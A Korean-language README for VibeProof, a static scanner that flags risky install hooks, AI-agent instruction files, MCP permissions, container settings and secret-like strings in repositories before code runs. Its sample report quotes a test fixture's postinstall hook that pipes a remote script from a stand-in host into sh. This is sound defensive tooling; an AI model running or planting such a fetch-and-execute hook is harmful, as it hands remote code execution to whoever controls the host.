# VibeProof

**Scan before your AI runs it.**

VibeProof는 AI 코딩 도구나 개발자가 저장소 코드를 실행하기 전에 위험 신호를 정적으로 확인하는 사전 점검 도구입니다. 공개 GitHub 저장소와 로컬 폴더를 스캔하며, 설치 훅, AI 에이전트 지시문, MCP 권한, 컨테이너 설정, 직접 URL 의존성, 비밀정보처럼 보이는 문자열을 검사합니다.

VibeProof는 저장소가 안전하다고 보장하지 않습니다. 실제 파일과 줄 번호에 연결된 증거를 제공해서 사람이 다음 검토 대상을 판단하도록 돕습니다.

## 30초 Quick Start

```powershell
npm install
npm run build
npm run scan -- ./fixtures/risky-postinstall
```

예상 출력 형태:

```text
VibeProof Risk Report

Verdict: BLOCK
Risk Score: 100/100

CRITICAL package.json:5 SCRIPT_REMOTE_EXEC_CRITICAL
         "postinstall": "curl https://example.invalid/install.sh | sh"

Evidence:
- package.json:5

No repository code was executed during this scan.
```

이 fixture는 의도적으로 `BLOCK`을 반환하므로 명령 종료 코드는 `2`입니다.

패키지 배포 후 공개 GitHub 저장소 스캔:

```powershell
npx vibeproof scan https://github.com/owner/repository
```

소스 체크아웃에서 로컬 폴더 스캔:

```powershell
npm run scan -- ./local-project
```

## CLI

```powershell
vibeproof scan <github-url-or-local-path>
vibeproof scan <target> --format terminal
vibeproof scan <target> --format json
vibeproof scan <target> --format markdown
vibeproof scan <target> --explain
vibeproof scan <target> --no-ai
vibeproof scan <target> --fail-on warn
vibeproof scan <target> --fail-on block
vibeproof rules list
vibeproof explain <rule-id>
```

기본값은 `--no-ai`입니다. 정적 탐지, 점수, 판정은 코드 기반으로 재현 가능하게 계산됩니다. GPT 설명은 검증된 정적 결과와 분리되며 v0.1.0에서는 기본 비활성화 상태입니다.

종료 코드:

| 판정 | 기본 종료 코드 |
| --- | --- |
| ALLOW | 0 |
| WARN | 1 |
| BLOCK | 2 |
| 내부 오류 또는 Verifier 실패 | 3 |

`--fail-on block`은 ALLOW와 WARN에서 0을 반환하고, BLOCK에서 2를 반환합니다.

## 검사 항목

- `package.json` 설치 lifecycle 훅과 원격 실행 패턴
- README 및 AI 에이전트 지시 파일의 위험 지시문
- 광범위한 filesystem 또는 shell 권한을 가진 MCP 설정
- privileged 모드, Docker socket mount 같은 컨테이너 설정
- 마스킹된 비밀정보 의심 문자열
- 직접 URL 또는 Git 의존성

모든 탐지 결과에는 규칙 ID, 심각도, 파일 경로, 줄 번호, 마스킹된 증거, 설명, 해결 방향, 점수 기여도가 포함됩니다.

## 구조

```text
apps/web               Next.js App Router UI
packages/cli           CLI 진입점
packages/core          공통 타입과 증거 헬퍼
packages/orchestrator  스캔 상태 머신
packages/scanners      정적 스캐너와 소스 탐색
packages/rules         규칙 데이터
packages/verifier      Zod 스키마와 증거 검증
packages/report        terminal, JSON, Markdown 출력
packages/ai-providers  선택적 GPT 리뷰 경계
fixtures               안전/위험 테스트 fixture
```

## 웹 UI

```powershell
npm run dev -w @vibeproof/web
```

브라우저에서 `http://localhost:3000`을 엽니다.

웹 UI는 공개 `https://github.com/owner/repo` URL을 입력받고 동일한 스캔 엔진을 호출합니다. 진행 단계, 판정, 점수, 증거를 보여주며 JSON과 Markdown 다운로드를 제공합니다. 서버의 임의 로컬 경로는 받지 않습니다.

## 검증

```powershell
npm run typecheck
npm run lint
npm run test
npm run build
npm run test:e2e
```

또는:

```powershell
npm run verify
```

GitHub Actions는 Windows, Ubuntu, macOS에서 동일한 핵심 검증을 실행합니다.

## 보안 경계

- 기본 스캔 중 대상 저장소 코드를 실행하지 않습니다.
- 대상 저장소의 `npm install`, `pip install`, setup, build, test 명령을 실행하지 않습니다.
- API 키는 서버 환경변수로만 다룹니다.
- 비밀정보처럼 보이는 증거는 마스킹합니다.
- GPT는 점수와 판정을 결정하지 않습니다.
- VibeProof는 안전을 보장하지 않고 정적 증거를 보고합니다.
